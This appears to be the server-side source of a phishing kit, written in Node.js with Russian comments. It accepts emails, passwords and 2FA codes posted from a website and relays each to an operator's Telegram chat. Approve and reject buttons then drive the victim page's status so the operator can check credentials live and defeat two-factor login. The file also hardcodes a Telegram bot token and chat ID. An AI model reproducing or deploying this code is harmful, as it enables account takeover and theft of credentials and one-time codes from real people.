const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const cors = require('cors');

// --- НАСТРОЙКИ ---
const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ'; 
const adminChatId = '-1003894478662'; 
// -----------------

const bot = new TelegramBot(token, { polling: true });
const app = express();

app.use(cors());
app.use(express.json());

let userStatuses = {}; 

// 1. Прием данных с сайта
app.post('/send-data', (req, res) => {
    const { type, email, pass, code, userId } = req.body;
    
    userStatuses[userId] = 'pending';
    console.log(`[${userId}] Новый запрос: ${type}`);

    let message = '';
    if (type === 'auth') {
        message = `⚠️ **Вход**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``;
    } else if (type === '2fa') {
        message = `🔢 **Код 2FA**: \`${code}\``;
    } else {
        message = `ℹ️ Инфо: ${req.body.text || 'нет данных'}`;
    }

    bot.sendMessage(adminChatId, message, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: '✅ Подтвердить', callback_data: `ok_${userId}` },
                { text: '❌ Неверно', callback_data: `err_${userId}` }
            ]]
        }
    });

    res.json({ status: 'ok' });
});

// 2. Обработка кнопок в Telegram
bot.on('callback_query', (query) => {
    const data = query.data.split('_');
    const action = data[0]; 
    const userId = data[1];

    if (action === 'ok') {
        userStatuses[userId] = 'success';
        console.log(`[${userId}] Админ нажал: ✅`);
    } else {
        userStatuses[userId] = 'error';
        console.log(`[${userId}] Админ нажал: ❌`);
    }

    bot.answerCallbackQuery(query.id, { text: "Статус обновлен" });
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id
    });
});

// 3. Проверка статуса сайтом
app.get('/check/:userId', (req, res) => {
    const userId = req.params.userId;
    const status = userStatuses[userId] || 'none';
    res.json({ status: status });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🚀 Сервер запущен на порту ${PORT}`));
